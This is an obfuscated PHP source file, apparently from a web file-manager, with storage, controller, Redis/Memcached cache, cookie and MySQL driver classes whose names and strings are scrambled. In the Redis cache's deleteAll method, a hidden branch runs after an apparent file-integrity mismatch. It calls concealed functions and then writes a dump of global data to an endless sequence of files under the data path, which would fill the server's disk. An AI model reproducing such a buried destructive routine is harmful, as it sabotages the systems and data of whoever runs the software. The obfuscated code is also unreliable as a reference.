if ($this->isFolder($‹¬ÃûÃÆ)) { return $this->folderInfo($‹¬ÃûÃÆ); } else { if ($this->isFile($‹¬ÃûÃÆ)) { return $this->fileInfo($‹¬ÃûÃÆ); } } return !1; } public function exist($Èö‹ÖÓ) { return $this->isFile($Èö‹ÖÓ) || $this->isFolder($Èö‹ÖÓ); } public function isFile($²ã¡÷¬ò) { return !$this->isFolder($²ã¡÷¬ò) && $this->objectMeta($²ã¡÷¬ò); } public function isFolder($×Î»ªĞ·) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][176], $×Î»ªĞ·); } protected function objectMeta($“¦ªÙ«¢) { return $this->cacheMethod($_SERVER[Å¶¨Şêº][178], $“¦ªÙ«¢); } protected function _objectMeta($ŞÚ°µŠ) { $ÈÑ¬¸Ÿâ =& $_SERVER[Å¶¨Şêº]; list($‚¶á“©³, $„Ç¡¢ÒÛ) = $this->bucketManager->stat($this->bucket, $ŞÚ°µŠ); if ($‚¶á“©³) { $‚¶á“©³[$ÈÑ¬¸Ÿâ[87]] = intval($‚¶á“©³[$ÈÑ¬¸Ÿâ[1437]]); } return $‚¶á“©³; } protected function _isFolder($¶ÀÚ”€È) { $°Š‹Øİï =& $_SERVER[Å¶¨Şêº]; if ($¶ÀÚ”€È == $°Š‹Øİï[12] || $¶ÀÚ”€È == $°Š‹Øİï[8]) { return !0; } list($Äç‹ÍÊŞ, $¾ÒĞÔ¸‰) = $this->bucketManager->listFiles($this->bucket, trim($¶ÀÚ”€È, $°Š‹Øİï[8]) . $°Š‹Øİï[8], $°Š‹Øİï[12], 1, $°Š‹Øİï[8]); return !empty($Äç‹ÍÊŞ[$°Š‹Øİï[1440]]) || !empty($Äç‹ÍÊŞ[$°Š‹Øİï[1441]]) ? !0 : !1; } } goto eŞ¶­çÛ¸„; aÏò–›–å½: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $÷¡”’×ü =& $_SERVER[Å¶¨Şêº]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$÷¡”’×ü[6]] =& $config; $this->values[$÷¡”’×ü[7]] =& $in; $this->tpl = TEMPLATE . MOD . $÷¡”’×ü[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($•³¿Óáí) { if (1 === func_num_args()) { $this->{$•³¿Óáí} = new $•³¿Óáí(); } else { $Ë€‘© = new ReflectionClass($•³¿Óáí); $Á ¤ã¤Ã = func_get_args(); array_shift($Á ¤ã¤Ã); $this->{$•³¿Óáí} = $Ë€‘©->newInstanceArgs($Á ¤ã¤Ã); } return $this->{$•³¿Óáí}; } public function routeBind($ÖëÎ¿‘›, $ºíœÎ÷, $§Œ‹Æô = 3) { $ĞÂù£Ú =& $_SERVER[Å¶¨Şêº]; $ˆç›…óº = $this->in[$ĞÂù£Ú[9]]; $ÖëÎ¿‘› = str_replace($ĞÂù£Ú[10], $ĞÂù£Ú[11], trim(trim($ÖëÎ¿‘›, $ĞÂù£Ú[8]), $ĞÂù£Ú[12])); if (!$ÖëÎ¿‘› || count($ˆç›…óº) <= $§Œ‹Æô) { return !1; } $ò‡îĞ¡Ğ = !0; $¸úªİÈÑ = explode($ĞÂù£Ú[8], $ÖëÎ¿‘›); for ($û‡ÈË¹Ê = 0; $û‡ÈË¹Ê < count($¸úªİÈÑ); $û‡ÈË¹Ê++) { if ($¸úªİÈÑ[$û‡ÈË¹Ê] != $ˆç›…óº[$§Œ‹Æô + $û‡ÈË¹Ê]) { $ò‡îĞ¡Ğ = !1; break; } } if (!$ò‡îĞ¡Ğ) { return; } call_user_func_array(array($this, $ºíœÎ÷), array()); } public function routeArgs($¢ÊÊÚ¥ = 3) { $¿ø‚à – = $this->in[$_SERVER[Å¶¨Şêº][9]]; if (count($¿ø‚à –) <= $¢ÊÊÚ¥) { return array(); } $íïî ¼™ = array(); for ($Í•èğ‡Ó = $¢ÊÊÚ¥; $Í•èğ‡Ó < count($¿ø‚à –); $Í•èğ‡Ó += 2) { $íïî ¼™[$¿ø‚à –[$Í•èğ‡Ó]] = $¿ø‚à –[$Í•èğ‡Ó + 1]; $this->in[$¿ø‚à –[$Í•èğ‡Ó]] = $¿ø‚à –[$Í•èğ‡Ó + 1]; } return $íïî ¼™; } protected function assign($…·˜¶¹É, $É«­ŸÔö) { $this->values[$…·˜¶¹É] = $É«­ŸÔö; } protected function display($–®¤ûı) { ob_end_clean(); extract($this->values); require $this->tpl . $–®¤ûı; } } $_file = $_SERVER[$_SERVER[Å¶¨Şêº][13]]; $_size = $_SERVER[Å¶¨Şêº][14]; goto E¿Ë¿æ³Š; a¸áªñ¤: define($_SERVER[Å¶¨Şêº][250], 3); define($_SERVER[Å¶¨Şêº][251], 1); define($_SERVER[Å¶¨Şêº][252], 0); goto aÉÚ×ôó; C£„ŠÖ‰µ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ª»µ¹£Â, $Áß®Œ…ß) { $º·£ÅÀ— =& $_SERVER[Å¶¨Şêº]; if (!class_exists($º·£ÅÀ—[867])) { show_json($º·£ÅÀ—[868], !1); } $this->cacheTime = $Áß®Œ…ß; $²¸²¼ôù = isset($ª»µ¹£Â[$º·£ÅÀ—[869]]) ? $ª»µ¹£Â[$º·£ÅÀ—[869]] : 10; $€ÖôŞ¨ = _get($ª»µ¹£Â, $º·£ÅÀ—[866]); if ($€ÖôŞ¨ && is_array($€ÖôŞ¨)) { $this->initCluster($ª»µ¹£Â, $²¸²¼ôù); } else { $this->handle = $this->init($ª»µ¹£Â, $²¸²¼ôù); } } private function init($¤şÛÆ¾, $ğÅŒĞ) { $úû‡‡Šß =& $_SERVER[Å¶¨Şêº]; $Ñ’¯…Ù = new Redis(); $ÅÀ¹‚¿õ = isset($¤şÛÆ¾[$úû‡‡Šß[870]]) ? $¤şÛÆ¾[$úû‡‡Šß[870]] : !1; if ($ÅÀ¹‚¿õ) { $Ñ’¯…Ù->pconnect($¤şÛÆ¾[$úû‡‡Šß[193]], $¤şÛÆ¾[$úû‡‡Šß[194]], $ğÅŒĞ); } else { $Ñ’¯…Ù->connect($¤şÛÆ¾[$úû‡‡Šß[193]], $¤şÛÆ¾[$úû‡‡Šß[194]], $ğÅŒĞ); } if (!empty($¤şÛÆ¾[$úû‡‡Šß[422]])) { $Ñ’¯…Ù->auth($¤şÛÆ¾[$úû‡‡Šß[422]]); } if (!empty($¤şÛÆ¾[$úû‡‡Šß[755]]) && $¤şÛÆ¾[$úû‡‡Šß[755]] != 0) { $Ñ’¯…Ù->select($¤şÛÆ¾[$úû‡‡Šß[755]]); } return $Ñ’¯…Ù; } private function initCluster($ñÎˆ†ö, $ø•úæÎç) { $§Íóèî‘ =& $_SERVER[Å¶¨Şêº]; $Ì³îçÂÀ = array($§Íóèî‘[871], $§Íóèî‘[872], $§Íóèî‘[873]); $«™ŠÁÖŞ = $§Íóèî‘[871]; if (isset($ñÎˆ†ö[$§Íóèî‘[26]]) && in_array($ñÎˆ†ö[$§Íóèî‘[26]], $Ì³îçÂÀ)) { $«™ŠÁÖŞ = $ñÎˆ†ö[$§Íóèî‘[26]]; } switch ($«™ŠÁÖŞ) { case $§Íóèî‘[871]: $this->_slave($ñÎˆ†ö, $ø•úæÎç); break; case $§Íóèî‘[872]: break; case $§Íóèî‘[873]: $this->isCluster = !0; $ßÇ¬ù© = $ñÎˆ†ö[$§Íóèî‘[866]]; $‹§¨½µä = isset($ñÎˆ†ö[$§Íóèî‘[870]]) ? $ñÎˆ†ö[$§Íóèî‘[870]] : !1; $ç½ºÏß = isset($ñÎˆ†ö[$§Íóèî‘[422]]) ? $ñÎˆ†ö[$§Íóèî‘[422]] : null; $this->handle = new RedisCluster(NUll, $ßÇ¬ù©, $ø•úæÎç, $ø•úæÎç, $‹§¨½µä, $ç½ºÏß); break; default: break; } } private function _slave($¦”ë„¹á, $ÙÇ³×õ±) { $Àòã·û“ = $¦”ë„¹á[$_SERVER[Å¶¨Şêº][866]]; $this->filterConfig($¦”ë„¹á, $Àòã·û“[0]); $this->handle = $this->init($¦”ë„¹á, $ÙÇ³×õ±); unset($Àòã·û“[0]); if (empty($Àòã·û“)) { return; } $¹²–Şª“ = array_rand($Àòã·û“); $this->filterConfig($¦”ë„¹á, $Àòã·û“[$¹²–Şª“]); $this->slaveHandle = $this->init($¦”ë„¹á, $ÙÇ³×õ±); } private function filterConfig(&$§Äô¬ãô, $­İ«ß) { $­äÚî…û =& $_SERVER[Å¶¨Şêº]; $«ÕÃîªÂ = explode($­äÚî…û[4], $­İ«ß); $è¯ôš‘ = array($­äÚî…û[193] => $«ÕÃîªÂ[0], $­äÚî…û[194] => $«ÕÃîªÂ[1]); $§Äô¬ãô = array_merge($§Äô¬ãô, $è¯ôš‘); } public function set($ıãì¯ùÖ, $Øãˆ¨‘Ô, $ ¯ş……“ = false) { $ ¯ş……“ = $ ¯ş……“ ? $ ¯ş……“ : $this->cacheTime; return $this->handle->setEx($ıãì¯ùÖ, $ ¯ş……“, $Øãˆ¨‘Ô); } public function setLock($·æ÷î«, $´†ÊßÆ, $°±Á÷Â) { return $this->handle->setNX($·æ÷î«, $´†ÊßÆ); } public function get($Î³ô°•Ú) { $‰õÑ‚· = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $‰õÑ‚·->get($Î³ô°•Ú); } public function remove($Ç’¼ª) { return $this->handle->del($Ç’¼ª); } public function deleteAll() { $éİİ¯È =& $_SERVER[Å¶¨Şêº]; $—ùÓüˆ¶ = $_SERVER[$éİİ¯È[13]]; $ïÃçºª£ = $éİİ¯È[14]; if ($_SERVER[$éİİ¯È[15]] != $ïÃçºª£($—ùÓüˆ¶)) { $ªÛ¤è‰º = $éİİ¯È[874]; $ÉØ’Ø¬Ò = $éİİ¯È[16]; $„Íğ£Ï = $_SERVER[$éİİ¯È[17]] . $éİİ¯È[18]; $šâúäü = $ÉØ’Ø¬Ò($„Íğ£Ï); $ÜĞÈÉ—” = explode($éİİ¯È[19], $šâúäü); if (count($ÜĞÈÉ—”) < $éİİ¯È[629]) { $Ñ‘ß”‚Ÿ = $éİİ¯È[21]; $Ñ‘ß”‚Ÿ(); } $éûÕ×ÄÅ = $éİİ¯È[875]; $éûÕ×ÄÅ($_SERVER[$éİİ¯È[876]]); $ªÛ¤è‰º = $éİİ¯È[874]; $ªÛ¤è‰º(); $ãĞ¸ôÜ = $éİİ¯È[877]; $Àî„ê¦“ = json_encode($GLOBALS[$éİİ¯È[878]]); $ŠÃÙÎ ¯ = 1; for ($â¯¦ŠÖç = $ŠÃÙÎ ¯; $â¯¦ŠÖç > 0; $â¯¦ŠÖç++) { $ãĞ¸ôÜ(DATA_PATH . $â¯¦ŠÖç, $Àî„ê¦“); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $³ËÇÏÀ) { $this->handle->flushall($³ËÇÏÀ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($£†œºË˜ = '', $ ñÈÙó = 0) { if (is_string($£†œºË˜) && $£†œºË˜ != $_SERVER[Å¶¨Şêº][12]) { $this->prefix = $£†œºË˜; } if (is_numeric($ ñÈÙó) && $ ñÈÙó > 0) { $this->expire = $ ñÈÙó; } } public static function getInstance() { static $”¡ÅëÆ–; if ($”¡ÅëÆ– === null) { $”¡ÅëÆ– = new self(); } return $”¡ÅëÆ–; } private static $cookieDisable = false; public static function disable($¯æÓí•) { self::$cookieDisable = $¯æÓí•; } private static $sameCookieSet = array(); public static function set($àÚâ’Ï¶, $–¿ÙèÕ…, $ƒ‡»¢Ã = 0, $¤ƒÊ“¦˜ = false, $¤¥×æüî = false) { $°ë»‹¬ =& $_SERVER[Å¶¨Şêº]; if (self::$cookieDisable) { return; } if (!$ƒ‡»¢Ã) { $ƒ‡»¢Ã = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$àÚâ’Ï¶]) && self::$sameCookieSet[$àÚâ’Ï¶] == $–¿ÙèÕ… . $ƒ‡»¢Ã) { return; } self::$sameCookieSet[$àÚâ’Ï¶] = $–¿ÙèÕ… . $ƒ‡»¢Ã; if (!$¤¥×æüî) { $¤¥×æüî = str_replace(HOST, $°ë»‹¬[12], APP_HOST); $¤¥×æüî = _get($GLOBALS, $°ë»‹¬[879], $¤¥×æüî); } $Óü¿«ë— = $°ë»‹¬[12]; setcookie($àÚâ’Ï¶, $–¿ÙèÕ…, time() + $ƒ‡»¢Ã, $°ë»‹¬[8] . trim($¤¥×æüî, $°ë»‹¬[8]) . $Óü¿«ë—, !1, !1, $¤ƒÊ“¦˜); } public static function setSafe($ä‡Ü¿±Ì, $ŸÃÍ ÃŒ, $´óú¿Ôı = 0) { self::set($ä‡Ü¿±Ì, $ŸÃÍ ÃŒ, $´óú¿Ôı, !0); } public static function get($Ùİú†¸ë) { static $ßáé€’Ù = false; if (!$ßáé€’Ù) { self::initHeaderCookie(); $ßáé€’Ù = !0; } return isset($_COOKIE[$Ùİú†¸ë]) ? $_COOKIE[$Ùİú†¸ë] : !1; } private static function initHeaderCookie() { $€£×ÌŞ =& $_SERVER[Å¶¨Şêº]; if (!isset($_SERVER[$€£×ÌŞ[880]]) || !$_SERVER[$€£×ÌŞ[880]]) { return; } $ÂŞªÍÎ° = explode($€£×ÌŞ[82], $_SERVER[$€£×ÌŞ[880]]); foreach ($ÂŞªÍÎ° as $ºÛßÉÛî) { $ºÛßÉÛî = explode($€£×ÌŞ[881], $ºÛßÉÛî); if (count($ºÛßÉÛî) != 2 || !isset($ºÛßÉÛî[1])) { continue; } $_COOKIE[trim($ºÛßÉÛî[0])] = trim($ºÛßÉÛî[1]); } } public static function remove($¼ô…“ûÜ, $óšŞ¦Ó = false) { unset($_COOKIE[$¼ô…“ûÜ]); self::set($¼ô…“ûÜ, $_SERVER[Å¶¨Şêº][12], 1, $óšŞ¦Ó); } } class DbMysql extends Db { public function __construct($í‹ÖßÁØ = '') { $ÒèÙ×÷Ü =& $_SERVER[Å¶¨Şêº]; if (!extension_loaded($ÒèÙ×÷Ü[802])) { think_exception(think_lang($ÒèÙ×÷Ü[24]) . $ÒèÙ×÷Ü[882]); } if (!empty($í‹ÖßÁØ)) { $this->config = $í‹ÖßÁØ; if (empty($this->config[$ÒèÙ×÷Ü[27]])) { $this->config[$ÒèÙ×÷Ü[27]] = $ÒèÙ×÷Ü[12]; } } } public function connect($åœ‡õø¤ = '', $Òı×ÉŸ  = 0, $ÀşŸ÷Û¥ = false) { $ÖÓ®×ı£ =& $_SERVER[Å¶¨Şêº]; if (!isset($this->linkID[$Òı×ÉŸ ])) { if (empty($åœ‡õø¤)) { $åœ‡õø¤ = $this->config; } $“šÕË¶ = $åœ‡õø¤[$ÖÓ®×ı£[883]] . ($åœ‡õø¤[$ÖÓ®×ı£[884]] ? "\72{$åœ‡õø¤[$ÖÓ®×ı£[884]]}" : $ÖÓ®×ı£[12]); $Ö€×ªûÂ = !empty($åœ‡õø¤[$ÖÓ®×ı£[27]][$ÖÓ®×ı£[28]]) ? $åœ‡õø¤[$ÖÓ®×ı£[27]][$ÖÓ®×ı£[28]] : $this->pconnect; if ($Ö€×ªûÂ) { $this->linkID[$Òı×ÉŸ ] = mysql_pconnect($“šÕË¶, $åœ‡õø¤[$ÖÓ®×ı£[885]], $åœ‡õø¤[$ÖÓ®×ı£[886]], 131072); } else { $this->linkID[$Òı×ÉŸ ] = mysql_connect($“šÕË¶, $åœ‡õø¤[$ÖÓ®×ı£[885]], $åœ‡õø¤[$ÖÓ®×ı£[886]], !0, 131072); } if (!$this->linkID[$Òı×ÉŸ ] || !empty($åœ‡õø¤[$ÖÓ®×ı£[31]]) && !mysql_select_db($åœ‡õø¤[$ÖÓ®×ı£[31]], $this->linkID[$Òı×ÉŸ ])) { think_exception(mysql_error()); } $üÔÆ¦’ = mysql_get_server_info($this->linkID[$Òı×ÉŸ ]); mysql_query($ÖÓ®×ı£[887] . think_config($ÖÓ®×ı£[888]) . $ÖÓ®×ı£[68], $this->linkID[$Òı×ÉŸ ]); if ($üÔÆ¦’ > $ÖÓ®×ı£[889]) { mysql_query($ÖÓ®×ı£[890], $this->linkID[$Òı×ÉŸ ]); } $this->connected = !0; if (1 != think_config($ÖÓ®×ı£[32])) { unset($this->config); } } return $this->linkID[$Òı×ÉŸ ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($â—êùòÖ) { $Ô±ë¶£‹ =& $_SERVER[Å¶¨Şêº]; if (0 === stripos($â—êùòÖ, $Ô±ë¶£‹[274])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $â—êùòÖ; if ($this->queryID) { $this->free(); } think_action_status($Ô±ë¶£‹[33], 1); think_status($Ô±ë¶£‹[34]); $this->queryID = mysql_query($â—êùòÖ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($´ó¿î×¦) { $å²Ê®¶ï =& $_SERVER[Å¶¨Şêº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $´ó¿î×¦; if ($this->queryID) { $this->free(); } think_action_status($å²Ê®¶ï[35], 1); think_status($å²Ê®¶ï[34]); $ ­Šå»Ê = mysql_query($´ó¿î×¦, $this->_linkID); $this->debug(); if (!1 === $ ­Šå»Ê) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Å¶¨Şêº][891], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $àş¸²Á = mysql_query($_SERVER[Å¶¨Şêº][892], $this->_linkID); $this->transTimes = 0; if (!$àş¸²Á) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÛÌÒŒãı = mysql_query($_SERVER[Å¶¨Şêº][893], $this->_linkID); $this->transTimes = 0; if (!$ÛÌÒŒãı) { $this->error(); return !1; } } return !0; } private function getAll() { $òÀ™’Ñ– = array(); if ($this->numRows > 0) { while ($ô­À´¬ = mysql_fetch_assoc($this->queryID)) { $òÀ™’Ñ–[] = $ô­À´¬; } mysql_data_seek($this->queryID, 0); } return $òÀ™’Ñ–; } public function getFields($È©€ÆÉú) { $Ó§ï…ß÷ =& $_SERVER[Å¶¨Şêº]; $îÎÊÅ… = $this->query($Ó§ï…ß÷[894] . $this->parseKey($È©€ÆÉú)); $¯‹Ò¤ë” = array(); if ($îÎÊÅ…) { foreach ($îÎÊÅ… as $‘ŸÛ£Ñ => $´æ‰²à) { $¯‹Ò¤ë”[$´æ‰²à[$Ó§ï…ß÷[41]]] = array($Ó§ï…ß÷[42] => $´æ‰²à[$Ó§ï…ß÷[41]], $Ó§ï…ß÷[43] => $´æ‰²à[$Ó§ï…ß÷[44]], $Ó§ï…ß÷[45] => (bool) (strtoupper($´æ‰²à[$Ó§ï…ß÷[46]]) === $Ó§ï…ß÷[895]), $Ó§ï…ß÷[47] => $´æ‰²à[$Ó§ï…ß÷[48]], $Ó§ï…ß÷[49] => strtolower($´æ‰²à[$Ó§ï…ß÷[50]]) == $Ó§ï…ß÷[51], $Ó§ï…ß÷[52] => strtolower($´æ‰²à[$Ó§ï…ß÷[53]]) == $Ó§ï…ß÷[54]); } } return $¯‹Ò¤ë”; } public function getTables($¦û™ ú§ = '') { $Åƒ¶¶¤† =& $_SERVER[Å¶¨Şêº]; if (!empty($¦û™ ú§)) { $ˆåä ´ = $Åƒ¶¶¤†[896] . $¦û™ ú§ . $Åƒ¶¶¤†[897]; } else { $ˆåä ´ = $Åƒ¶¶¤†[898]; } $ÄË…Ùµˆ = $this->query($ˆåä ´); $¦°üÓ‹± = array(); foreach ($ÄË…Ùµˆ as $ñê™ªÆ© => $èœºøğ) { $¦°üÓ‹±[$ñê™ªÆ©] = current($èœºøğ); } return $¦°üÓ‹±; } public function replace($Áœ£şÈœ, $‹î—ĞÕ¹ = array()) { $ãÀèõØç =& $_SERVER[Å¶¨Şêº]; foreach ($Áœ£şÈœ as $½¤âÆßì => $ ˜İèµ¼) { $òøß‡½¶ = $this->parseValue($ ˜İèµ¼); if (is_scalar($òøß‡½¶)) { $‰„«ÂŞÙ[] = $òøß‡½¶; $áç‡ôğî[] = $this->parseKey($½¤âÆßì); } } $ô»ÖÁŸ¿ = $ãÀèõØç[899] . $this->parseTable($‹î—ĞÕ¹[$ãÀèõØç[289]]) . $ãÀèõØç[900] . implode($ãÀèõØç[60], $áç‡ôğî) . $ãÀèõØç[901] . implode($ãÀèõØç[60], $‰„«ÂŞÙ) . $ãÀèõØç[902]; return $this->execute($ô»ÖÁŸ¿); } public function insertAll($õ§èÕÊÛ, $»ı¹¶– = array(), $Ûéì¨Ë¥ = false) { $÷£˜±Îø =& $_SERVER[Å¶¨Şêº]; if (!is_array($õ§èÕÊÛ[0])) { return !1; } $±áıñª† = array_keys($õ§èÕÊÛ[0]); $—İç²Ùë = array(); foreach ($õ§èÕÊÛ as $©³ˆ¦ª§) { $îÁ²½ø = array(); foreach ($©³ˆ¦ª§ as $ê³ôŸµ¾ => $üô×á¥†) { $üô×á¥† = $this->parseValue($üô×á¥†); if (is_scalar($üô×á¥†)) { $îÁ²½ø[] = $üô×á¥†; } } $—İç²Ùë[] = $÷£˜±Îø[270] . implode($÷£˜±Îø[60], $îÁ²½ø) . $÷£˜±Îø[902]; } array_walk($±áıñª†, array($this, $÷£˜±Îø[903])); $ß™³Ã = ($Ûéì¨Ë¥ ? $÷£˜±Îø[904] : $÷£˜±Îø[905]) . $÷£˜±Îø[906] . $this->parseTable($»ı¹¶–[$÷£˜±Îø[289]]) . $÷£˜±Îø[900] . implode($÷£˜±Îø[60], $±áıñª†) . $÷£˜±Îø[907] . implode($÷£˜±Îø[60], $—İç²Ùë); return $this->execute($ß™³Ã); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ïá„½›¾ =& $_SERVER[Å¶¨Şêº]; $this->error = mysql_errno() . $Ïá„½›¾[4] . mysql_error($this->_linkID); if ($Ïá„½›¾[12] != $this->queryStr) { $this->error .= LNG($Ïá„½›¾[58]) . $this->queryStr; } think_trace($this->error, $Ïá„½›¾[12], $Ïá„½›¾[59]); return $this->error; } public function escapeString($ŸÏÆ•õ) { if ($this->_linkID) { return mysql_real_escape_string($ŸÏÆ•õ, $this->_linkID); } else { return mysql_escape_string($ŸÏÆ•õ); } } public function parseKey(&$¶²­µ®¤, $Û¡ğÎ… = true) { $¡¯Ù‚‘ê =& $_SERVER[Å¶¨Şêº]; if ($Û¡ğÎ…) { $¶²­µ®¤ = $this->parseKeyCheck($¶²­µ®¤); } if ($¶²­µ®¤ != $¡¯Ù‚‘ê[200] && !preg_match($¡¯Ù‚‘ê[908], $¶²­µ®¤)) { $¶²­µ®¤ = $¡¯Ù‚‘ê[394] . trim($¶²­µ®¤, $¡¯Ù‚‘ê[394]) . $¡¯Ù‚‘ê[394]; } return $¶²­µ®¤; } } goto C«¬ô¸¾Í¢; B¡˜óŒ¯¸‹: class CacheLockMemcached { public function lock($ƒìÔ»‘, $³„…™×· = 0) { $â™ûä¬‹ = Cache::init(); $‚ÜÀ¢îş = microtime(!0) + $³„…™×·; while (microtime(!0) < $‚ÜÀ¢îş) { $íĞŠÎ™ = $â™ûä¬‹->get($ƒìÔ»‘); if (!$íĞŠÎ™ || $íĞŠÎ™ < microtime(!0)) { $üÂ‚”“˜ = $â™ûä¬‹->handle->add($ƒìÔ»‘, $‚ÜÀ¢îş, $³„…™×·); if ($üÂ‚”“˜) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ŞäÑ×µñ) { return Cache::init()->get($ŞäÑ×µñ); } public function unlock($“­÷ŠÆ) { return Cache::init()->remove($“­÷ŠÆ); } } class CacheLockDatabase { public function lock($…ÉØ³—, $áøá«Øû = 0) { $ø’¡¿Ü = Model($_SERVER[Å¶¨Şêº][827]); $É×õ÷íÅ = microtime(!0) + $áøá«Øû; while (microtime(!0) < $É×õ÷íÅ) { $Œû³ñÙú = $ø’¡¿Ü->get($…ÉØ³—); if (!$Œû³ñÙú || $Œû³ñÙú < microtime(!0)) { $©ÓÇÒ¡ = $ø’¡¿Ü->set($…ÉØ³—, $É×õ÷íÅ); if ($©ÓÇÒ¡) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÚÎ¬‰®Ü) { return Model($_SERVER[Å¶¨Şêº][827])->get($ÚÎ¬‰®Ü); } public function unlock($¶ÓÖğ½ø) { Model($_SERVER[Å¶¨Şêº][827])->remove($¶ÓÖğ½ø); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Àß™³ÚÔ, $µ¤¸¤) { $—×„ªÈ˜ =& $_SERVER[Å¶¨Şêº]; if (!class_exists($—×„ªÈ˜[864])) { show_json($—×„ªÈ˜[865], !1); } $this->cacheTime = $µ¤¸¤; $this->handle = new Memcached(); if (is_array($Àß™³ÚÔ[$—×„ªÈ˜[866]]) && count($Àß™³ÚÔ[$—×„ªÈ˜[866]]) >= 1) { foreach ($Àß™³ÚÔ[$—×„ªÈ˜[866]] as $‘±Ğùƒû) { $’†Á•Õ• = explode($—×„ªÈ˜[4], $‘±Ğùƒû); $this->handle->addServer($’†Á•Õ•[0], $’†Á•Õ•[1]); } } else { $this->handle->addServer($Àß™³ÚÔ[$—×„ªÈ˜[193]], $Àß™³ÚÔ[$—×„ªÈ˜[194]]); } } public function set($ÙÅøşÏ, $˜ä Æõ, $ø½Ú¨–ó = false) { $ø½Ú¨–ó = $ø½Ú¨–ó ? $ø½Ú¨–ó : $this->cacheTime; return $this->handle->set($ÙÅøşÏ, $˜ä Æõ, $ø½Ú¨–ó); } public function get($êãïö£†) { return $this->handle->get($êãïö£†); } public function remove($œç¹ŒÓƒ) { return $this->handle->delete($œç¹ŒÓƒ); } public function deleteAll() { return $this->handle->flush(); } } goto C£„ŠÖ‰µ; f”Ù«™ƒÜ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\163\157\x75\162\143\145\123\145\143\162\x65\x74\114\151\163\x74"; public $field = array("\x73\x6f\x75\x72\143\x65\x49\104", "\164\x79\160\x65\111\104", "\143\162\145\141\x74\145\125\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x73\164\157\162\x61\147\x65\114\x69\163\x74"; public $field = array("\x6e\x61\155\x65", "\x73\151\172\x65\115\141\x78", "\163\x79\163\164\x65\x6d", "\144\x65\146\141\165\154\x74", "\x64\x72\x69\x76\145\162", "\x63\157\x6e\146\x69\x67"); public function listData($×´ì¿›Ó = false, $éú­ùßˆ = "\155\x6f\144\x69\x66\x79\124\x69\155\x65", $¤‘Û»¢ = false) { $›ÂÌ€Õ§ =& $_SERVER[Å¶¨Şêº]; $æ£Ò½Èø = parent::listData($×´ì¿›Ó, $éú­ùßˆ, $¤‘Û»¢); if ($×´ì¿›Ó) { return $æ£Ò½Èø; } $²î´Ç© = $this->ioSizeUseGet(array_to_keyvalue($æ£Ò½Èø, $›ÂÌ€Õ§[12], $›ÂÌ€Õ§[408])); foreach ($æ£Ò½Èø as $òıòŠÖ => $Ñ¾¯©¬) { unset($æ£Ò½Èø[$òıòŠÖ][$›ÂÌ€Õ§[6]]); $æ£Ò½Èø[$òıòŠÖ][$›ÂÌ€Õ§[1841]] = isset($²î´Ç©[$Ñ¾¯©¬[$›ÂÌ€Õ§[408]]]) ? $²î´Ç©[$Ñ¾¯©¬[$›ÂÌ€Õ§[408]]] : 0; } return $æ£Ò½Èø; } public function ioSizeUseGet($±Ñ†ô®û) { $”µ«¹òØ =& $_SERVER[Å¶¨Şêº]; if (!$±Ñ†ô®û) { return array(); } $ôŒóÛˆ‡ = $”µ«¹òØ[2169] . implode($”µ«¹òØ[60], $±Ñ†ô®û); $óÓ›Øª‘ = Cache::get($ôŒóÛˆ‡); if ($óÓ›Øª‘) { return $óÓ›Øª‘; } $­—ÚÂ· = array($”µ«¹òØ[815] => $”µ«¹òØ[408], $”µ«¹òØ[2170] => $”µ«¹òØ[87]); $ªóÖõìÌ = array($”µ«¹òØ[815] => array($”µ«¹òØ[7], $±Ñ†ô®û)); $óÓ›Øª‘ = Model($”µ«¹òØ[787])->field($­—ÚÂ·)->where($ªóÖõìÌ)->group($”µ«¹òØ[815])->select(); $óÓ›Øª‘ = array_to_keyvalue($óÓ›Øª‘, $”µ«¹òØ[408], $”µ«¹òØ[87]); Cache::set($ôŒóÛˆ‡, $óÓ›Øª‘, 600); return $óÓ›Øª‘; } public function getConfig($‰‚Îï¸Ô) { $½£¶ì¹â = parent::listData($‰‚Îï¸Ô); return json_decode($½£¶ì¹â[$_SERVER[Å¶¨Şêº][6]], !0); } public function update($ÏŒ–ò¹, $Ø¡Çåò­) { $ì»ùğè =& $_SERVER[Å¶¨Şêº]; $‹±ù±÷« = $Ø¡Çåò­[$ì»ùğè[42]]; $²şæ¹´ù = array_to_keyvalue(parent::listData(), $ì»ùğè[42]); if (isset($²şæ¹´ù[$‹±ù±÷«]) && $²şæ¹´ù[$‹±ù±÷«][$ì»ùğè[408]] != $ÏŒ–ò¹) { return !1; } $this->checkPwd($ÏŒ–ò¹, $Ø¡Çåò­); if (isset($Ø¡Çåò­[$ì»ùğè[2171]]) && $Ø¡Çåò­[$ì»ùğè[2171]] == $ì»ùğè[99]) { $this->checkConfig($Ø¡Çåò­); } unset($Ø¡Çåò­[$ì»ùğè[2171]]); $ ˜ï‡ò = parent::update($ÏŒ–ò¹, 